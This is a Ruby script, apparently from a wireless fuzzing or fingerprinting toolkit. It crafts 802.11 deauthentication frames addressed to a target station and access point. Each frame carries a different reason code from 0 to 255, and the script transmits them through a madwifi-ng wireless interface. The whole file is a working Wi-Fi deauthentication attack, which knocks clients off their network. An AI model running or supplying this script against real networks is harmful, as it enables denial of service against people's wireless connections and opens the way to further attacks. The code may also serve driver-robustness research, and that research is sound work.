#!/usr/bin/ruby
require "baflle-send"

#$blackhole1 = "00:18:F8:F4:53:1C"
#$blackhole2 = "00:12:0E:51:AC:55"
#$aruba      = "00:0b:86:80:e4:e0"
#$airport    = "00:11:24:5c:7b:07"

if ARGV.length < 2
  puts "Usage: ./deauth_client_attack_send.rb [target station mac] [associated ap mac]"
  exit
end

$station    = ARGV[0]
$ap         = ARGV[1]

$deauth = PacketSet.new(Dot11Deauth,
                        :reason => 0..255)

$packets = PacketSet.new(Dot11, 
                        :subtype =>   0xC,
                        :type =>      0x0,
                        :version =>   0x0,
                        :flags =>     0x0,
                        :duration =>  0x0000,
                        :addr1 =>     $station,
                        :addr2 =>     $ap,
                        :addr3 =>     $ap,
                        :sc =>        0x0000, # This is auto-filled in by the driver.
                        :payload =>   $deauth)

$packets.randomize = true

p $packets.size

emit "ath0", "madwifing", $packets

